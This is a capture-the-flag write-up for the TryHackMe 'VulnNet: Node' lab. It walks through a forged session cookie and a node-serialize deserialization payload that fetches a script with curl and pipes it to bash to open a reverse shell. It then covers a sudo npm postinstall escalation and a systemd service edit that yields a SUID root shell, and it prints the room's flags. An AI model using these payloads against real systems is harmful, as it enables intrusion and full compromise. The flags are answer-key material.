## VulnNet: Node - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/vulnnetnode)

VulnNet Entertainment has moved its infrastructure and now they're confident that no breach will happen again. You're tasked to prove otherwise and penetrate their network.

    Difficulty: Easy
    Web Language: JavaScript

This is again an attempt to recreate some more realistic scenario but with techniques packed into a single machine. Good luck!

Icon made by Freepik from www.flaticon.com

**IP: 10.10.70.241**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Gobuster, Burp Suite<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan and Gobuster.

  ```
  nmap -sC -sV -T5 -p- 10.10.70.241

  PORT      STATE    SERVICE VERSION
  8080/tcp  open     http    Node.js Express framework
  |_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
  10309/tcp filtered unknown
  18779/tcp filtered unknown
  22529/tcp filtered unknown
  30750/tcp filtered unknown
  32037/tcp filtered unknown
  56777/tcp filtered unknown
  58600/tcp filtered unknown
  59419/tcp filtered unknown
  61425/tcp filtered unknown
  ```

  ```
  gobuster dir -u http://10.10.70.241:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /img                  (Status: 301) [Size: 173] [--> /img/]
  /login                (Status: 200) [Size: 2127]
  /css                  (Status: 301) [Size: 173] [--> /css/]
  /Login                (Status: 200) [Size: 2127]
  /IMG                  (Status: 301) [Size: 173] [--> /IMG/]
  /CSS                  (Status: 301) [Size: 173] [--> /CSS/]
  /Img                  (Status: 301) [Size: 173] [--> /Img/]
  Progress: 87664 / 87665 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- OK, so anything I visited from found directories was useless, so I start exploring with Burp and found that I already have Cookie assigned even though I haven't logged in yet.

  ```
  GET / HTTP/1.1
  Host: 10.10.70.241:8080
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Referer: http://10.10.70.241:8080/login
  Connection: keep-alive
  Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D
  Upgrade-Insecure-Requests: 1
  If-None-Match: W/"1daf-dPXia8DLlOwYnTXebWSDo/Cj9Co"
  Priority: u=0, i
  
  
  eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D
  {"username":"Guest","isGuest":true,"encoding": "utf-8"}%3D%3D
  ```

---

## 🌐 Web Exploitation & Shell Access

- I started experimenting with different payloads, first with admin.

  ```
  {"username":"admin","isAdmin":true,"encoding": "utf-8"}%3D%3D
  eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ== 
  %65%79%4a%31%63%32%56%79%62%6d%46%74%5a%53%49%36%49%6d%46%6b%62%57%6c%75%49%69%77%69%61%58%4e%42%5a%47%31%70%62%69%49%36%64%48%4a%31%5a%53%77%69%5a%57%35%6a%62%32%52%70%62%6d%63%69%4f%69%41%69%64%58%52%6d%4c%54%67%69%66%51%3d%3d
  ```

  ```
  Request:

  GET / HTTP/1.1
  Host: 10.10.70.241:8080
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Referer: http://10.10.70.241:8080/login
  Connection: keep-alive
  Cookie: session=%65%79%4a%31%63%32%56%79%62%6d%46%74%5a%53%49%36%49%6d%46%6b%62%57%6c%75%49%69%77%69%61%58%4e%42%5a%47%31%70%62%69%49%36%64%48%4a%31%5a%53%77%69%5a%57%35%6a%62%32%52%70%62%6d%63%69%4f%69%41%69%64%58%52%6d%4c%54%67%69%66%51%3d%3d
  Upgrade-Insecure-Requests: 1
  If-None-Match: W/"1daf-dPXia8DLlOwYnTXebWSDo/Cj9Co"
  Priority: u=0, i
  
  Response:
  
  <h1 class="brand-title">Welcome, admin</h1>
  <h2 class="brand-tagline">Please login to continue...</h2>
  <nav class="nav"><ul class="nav-list"><li class="nav-item">
  <a class="pure-button" href="/login">➤ Login Now</a>
  ```
  
- At one point, I deleted half of the cookie and sent a request, this is what I got.

  ```
  Request:

  GET / HTTP/1.1
  Host: 10.10.70.241:8080
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Referer: http://10.10.70.241:8080/login
  Connection: keep-alive
  Cookie: session=%65%79%4a%31%63%32%56%79%62%6d%46%74%5a%53%49%36%49%6d%46%6b%62%57%6c%75%49%69%77%69%61%58%4e%42%5a%47%31%70
  Upgrade-Insecure-Requests: 1
  Content-Length: 2
  
  Response:
  
  SyntaxError: Unexpected end of JSON input<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> 
  &nbsp; &nbsp;at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)<br> 
  &nbsp; &nbsp;at /home/www/VulnNet-Node/server.js:16:24<br> 
  &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)<br> 
  &nbsp; &nbsp;at next (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:137:13)<br> 
  &nbsp; &nbsp;at Route.dispatch (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:112:3)<br> 
  &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)<br>
  &nbsp; &nbsp;at /home/www/VulnNet-Node/node_modules/express/lib/router/index.js:281:22<br> 
  &nbsp; &nbsp;at Function.process_params (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12)<br> 
  &nbsp; &nbsp;at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)
  
  &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at Object.exports.unserialize
  ```
  
- Well, this is JS deserialization bug so I looked for some exploits and found one.

  ```
  {"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',
  function(error, stdout, stderr) { console.log(stdout) });\n }()"}
  ```

- It will execute `ls`, but let's do reverse shell shall we? Create a standard bash one-liner, add it to original cookie value and encode it with base64 than URL encoding.

  ```
  nano shell.seh
  
  #!/bin/bash
  bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1
  
  {"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl [YOUR-THM-IP]:80/shell.sh | bash ', function(error, stdout, stderr) { console.log(stdout) });\n }()","isAdmin":true,"encoding": "utf-8"}

  %65%79%4a%31%63%32%56%79%62%6d%46%74%5a%53%49%36%49%6c%38%6b%4a%45%35%45%58%30%5a%56%54%6b7%4e%76%62%6e%4[SNIP!]2%32%52%70%62%6d%63%69%4f%69%41%69%64%58%52%6d%4c%54%67%69%66%51%3d%3d
  ```

- Now put encoded payload as cookie value, start Python HTTP server and start a listener, after that just send the payload with Burp and watch the magic happening.

  ```
  GET / HTTP/1.1
  Host: 10.10.70.241:8080
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Referer: http://10.10.70.241:8080/login
  Connection: keep-alive
  Cookie: session=%65%79%4a%31%63%32%56%79%62%6d%46%74%5a%53%49%36%49%6c%38%6b%4a%45%35%45%58%30%[SNIP!]%6d%63%69%4f%69%41%69%64%58%52%6d%4c%54%67%69%66%51%3d%3d
  Upgrade-Insecure-Requests: 1
  Content-Length: 2
  
  python3 -m http.server 80  
  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
  10.10.70.241 - - [19/May/2025 15:05:09] "GET /shell.sh HTTP/1.1" 200 -
  
  nc -lvnp 4444       
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.70.241] 47954
  bash: cannot set terminal process group (573): Inappropriate ioctl for device
  bash: no job control in this shell
  www@vulnnet-node:~/VulnNet-Node$ whoami
  whoami
  www
  www@vulnnet-node:~/VulnNet-Node$ id
  id
  uid=1001(www) gid=1001(www) groups=1001(www)
  ```

---

## 🧍 User Privilege Escalation

- Now flag action, first we need to escalate to user `serv-manage`.

  ```
  www@vulnnet-node:~/VulnNet-Node/node_modules$ sudo -l
  Matching Defaults entries for www on vulnnet-node:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User www may run the following commands on vulnnet-node:
      (serv-manage) NOPASSWD: /usr/bin/npm
  ```
  
- You can use the exploit from GTFOBins, but this is how I did it. Create a new temporary directory with fake `package.json` file and then just run the `npm` binary. GTFOBins exploit does the same.

  ```
  mkdir /tmp/pwnnpm
  cd /tmp/pwnnpm
  cat > package.json << 'EOF'
  {
    "name": "pwn",
    "version": "1.0.0",
    "scripts": {
      "postinstall": "/bin/bash"
    }
  }
  EOF
  
  sudo -u serv-manage /usr/bin/npm install
  ```

  ```
  www@vulnnet-node:~/VulnNet-Node$ mkdir /tmp/pwnnpm
  www@vulnnet-node:~/VulnNet-Node$ cd /tmp/pwnnpm
  www@vulnnet-node:/tmp/pwnnpm$ cat > package.json << 'EOF'
  > {
  >   "name": "pwn",
  >   "version": "1.0.0",
  >   "scripts": {
  >     "postinstall": "/bin/bash"
  >   }
  > }
  > EOF
  www@vulnnet-node:/tmp/pwnnpm$ ls -al
  total 12
  drwxr-xr-x  2 www  www  4096 May 19 16:20 .
  drwxrwxrwt 10 root root 4096 May 19 16:20 ..
  -rw-r--r--  1 www  www    93 May 19 16:20 package.json
  
  www@vulnnet-node:/tmp/pwnnpm$ sudo -u serv-manage /usr/bin/npm install
  
  > pwn@1.0.0 postinstall /tmp/pwnnpm
  > /bin/bash
  
  serv-manage@vulnnet-node:/tmp/pwnnpm$ whoami
  serv-manage
  serv-manage@vulnnet-node:/tmp/pwnnpm$ id
  uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
  ```
  
- Now just read the user flag and move to root escalation.

---

## 👑 Root Privilege Escalation

- As always, run `sudo -l` first.

  ```
  serv-manage@vulnnet-node:~$ sudo -l
  Matching Defaults entries for serv-manage on vulnnet-node:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User serv-manage may run the following commands on vulnnet-node:
      (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
      (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
      (root) NOPASSWD: /bin/systemctl daemon-reload
  ```
  
- Now, enumerate those running services. GTFOBins exploit for `systemctl` will also work fine.

  ```
  serv-manage@vulnnet-node:~$ systemctl cat vulnnet-auto.timer
  # /etc/systemd/system/vulnnet-auto.timer
  [Unit]
  Description=Run VulnNet utilities every 30 min
  
  [Timer]
  OnBootSec=0min
  # 30 min job
  OnCalendar=*:0/30
  Unit=vulnnet-job.service
  
  [Install]
  WantedBy=basic.target
  
  serv-manage@vulnnet-node:~$ systemctl cat vulnnet-job.service
  # /etc/systemd/system/vulnnet-job.service
  [Unit]
  Description=Logs system statistics to the systemd journal
  Wants=vulnnet-auto.timer
  
  [Service]
  # Gather system statistics
  Type=forking
  ExecStart=/bin/df
  
  [Install]
  WantedBy=multi-user.target
  
  serv-manage@vulnnet-node:~$ ls -al /bin/df
  -rwxr-xr-x 1 root root 84776 Jan 18  2018 /bin/df
  ```
  
- Since we can't write to `/bin/df`, I then checked `vulnnet-job.service` and BINGO, we can edit it.

  ```
  serv-manage@vulnnet-node:~$ ls -l /etc/systemd/system/vulnnet-job.service 
  -rw-rw-r-- 1 root serv-manage 197 Jan 24  2021 /etc/systemd/system/vulnnet-job.service
  
  serv-manage@vulnnet-node:~$ nano /etc/systemd/system/vulnnet-job.service 
  serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-job.service 
  [Unit]
  Description=Logs system statistics to the systemd journal
  Wants=vulnnet-auto.timer
  
  [Service]
  # Gather system statistics
  Type=forking
  ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
  RemainAfterExit=yes
  
  [Install]
  WantedBy=multi-user.target
  ```

- Replace the original values with this:

  ```
  ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
  RemainAfterExit=yes
  ```

- Now just reset services and then wait for like 20 seconds then run `/tmp/rootbash -p` and you are root.

  ```
  serv-manage@vulnnet-node:~$ sudo systemctl daemon-reload
  serv-manage@vulnnet-node:~$ sudo systemctl start vulnnet-auto.timer
  
  serv-manage@vulnnet-node:~$ /tmp/rootbash -p
  rootbash-4.4# whoami
  root
  rootbash-4.4# id
  uid=1000(serv-manage) gid=1000(serv-manage) euid=0(root) egid=0(root) groups=0(root),1000(serv-manage)
  rootbash-4.4# cat /root/root.txt
  THM{abea728f211b105a608a720a37adabf9}
  ```

---

## 🏁 Flags

- **User Flag**: `THM{064640a2f880ce9ed7a54886f1bde821}`
- **Root Flag**: `THM{abea728f211b105a608a720a37adabf9}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Getting initial access and learning my way around escalations.`

- What did I learn?
  `A lot when it comes to Web exploitation, some new payloads as well.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
